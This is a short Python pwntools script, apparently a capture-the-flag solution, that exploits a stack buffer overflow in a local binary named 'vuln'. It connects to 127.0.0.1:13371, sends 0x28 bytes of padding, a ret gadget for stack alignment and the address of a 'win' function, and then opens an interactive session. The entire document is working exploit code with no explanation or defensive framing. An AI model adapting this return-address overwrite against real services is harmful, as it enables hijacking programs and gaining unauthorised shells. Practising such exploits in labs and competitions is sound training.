#!/usr/bin/env python3
from pwn import *

# 连接目标
HOST, PORT = '127.0.0.1', 13371
r = remote(HOST, PORT)

elf = ELF('./vuln', checksec=False)

win     = elf.symbols['win']          # 0x401176
ret     = next(elf.search(b'\xc3'))   # 0x40101a  stack alignment

# buf[0x20] + saved rbp[8] = 0x28 bytes padding
payload  = b'A' * 0x28
payload += p64(ret)   # align stack to 16 bytes (system() inside win needs it)
payload += p64(win)

r.send(payload)
r.interactive()
